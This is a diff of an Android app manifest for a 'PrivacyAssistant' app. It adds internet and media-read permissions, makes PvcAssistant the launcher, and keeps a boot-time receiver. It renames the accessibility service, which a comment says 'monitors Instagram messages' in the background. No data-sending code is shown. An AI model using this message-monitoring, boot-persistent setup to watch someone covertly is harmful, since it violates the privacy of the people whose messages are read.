@@ -5,7 +5,10 @@
     <uses-permission android:name="android.permission.POST_NOTIFICATIONS" />
     <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
     <uses-permission android:name="android.permission.QUERY_ALL_PACKAGES" />
-
+    <uses-permission android:name="android.permission.INTERNET" />
+    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"
+        android:maxSdkVersion="32" />
+    <uses-permission android:name="android.permission.READ_MEDIA_IMAGES" />
 
     <application
         android:allowBackup="true"
@@ -17,27 +20,31 @@
         android:supportsRtl="true"
         android:theme="@style/Theme.PrivacyAssistant"
         tools:targetApi="31">
+
+        <!-- MAIN LAUNCHER - PvcAssistant is your main app screen -->
         <activity
-            android:name=".MainActivity"
+            android:name=".PvcAssistant"
             android:exported="true"
             android:label="@string/app_name"
             android:theme="@style/Theme.PrivacyAssistant">
             <intent-filter>
                 <action android:name="android.intent.action.MAIN" />
-
                 <category android:name="android.intent.category.LAUNCHER" />
             </intent-filter>
         </activity>
 
-        <activity
-            android:name=".PvcAssistant"
-            android:exported="true" />
+        <!-- MainActivity - Keep if needed for other purposes, but NOT as launcher -->
 
+        <activity
+            android:name=".MainActivity"
+            android:exported="false"
+            android:theme="@style/Theme.PrivacyAssistant" />
+
+        <!-- ACCESSIBILITY SERVICE - monitors Instagram messages (runs in background) -->
         <service
-            android:name=".MyAccessibilityService"
+            android:name=".InstagramAccessibilityService"
             android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE"
-            android:exported="true"
-            android:enabled="true">
+            android:exported="false">
             <intent-filter>
                 <action android:name="android.accessibilityservice.AccessibilityService" />
             </intent-filter>
@@ -45,18 +52,20 @@
                 android:name="android.accessibilityservice"
                 android:resource="@xml/accessibility_service_config" />
         </service>
-    <receiver 
-    android:name=".InstagramBroadcastReceiver"
-    android:enabled="true"
-    android:exported="true"
-    android:permission="android.permission.RECEIVE_BOOT_COMPLETED">
-    <intent-filter>
-        <action android:name="android.intent.action.BOOT_COMPLETED" />
-        <action android:name="android.intent.action.QUICKBOOT_POWERON" />
-        <action android:name="android.intent.action.LOCKED_BOOT_COMPLETED" />
-        <action android:name="android.intent.action.MY_PACKAGE_REPLACED" />
-    </intent-filter>
-</receiver>
+
+        <!-- BROADCAST RECEIVER - handles boot and package events -->
+        <receiver
+            android:name=".InstagramBroadcastReceiver"
+            android:enabled="true"
+            android:exported="true">
+            <intent-filter>
+                <action android:name="android.intent.action.BOOT_COMPLETED" />
+                <action android:name="android.intent.action.QUICKBOOT_POWERON" />
+                <action android:name="android.intent.action.LOCKED_BOOT_COMPLETED" />
+                <action android:name="android.intent.action.MY_PACKAGE_REPLACED" />
+            </intent-filter>
+        </receiver>
+
     </application>
 
 </manifest>
